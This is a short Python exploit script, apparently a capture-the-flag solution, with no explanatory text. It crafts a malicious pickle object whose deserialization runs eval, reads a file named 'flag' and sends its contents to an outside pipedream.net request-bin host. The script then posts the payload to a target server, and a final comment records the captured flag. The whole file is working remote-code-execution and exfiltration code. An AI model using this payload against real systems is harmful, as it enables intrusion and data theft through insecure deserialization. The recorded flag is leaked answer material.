from requests import post
from cPickle import dumps,loads
from base64 import urlsafe_b64encode, b64decode
from os import system

class RCE(object):
    def __reduce__(self):
        return eval, ('__import__("urllib2").urlopen("https://enlo7vbseone.x.pipedream.net/",data=str(open("flag").read()))', )

if __name__ == "__main__":
    rce = RCE()
    payload = urlsafe_b64encode(dumps(rce))

    print ("[+] Payload: {}".format(payload))

    r = post('http://35.246.180.101:32111/', data=payload).text

    print ("--- --- --- --- ---")
    print (r)

# ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}
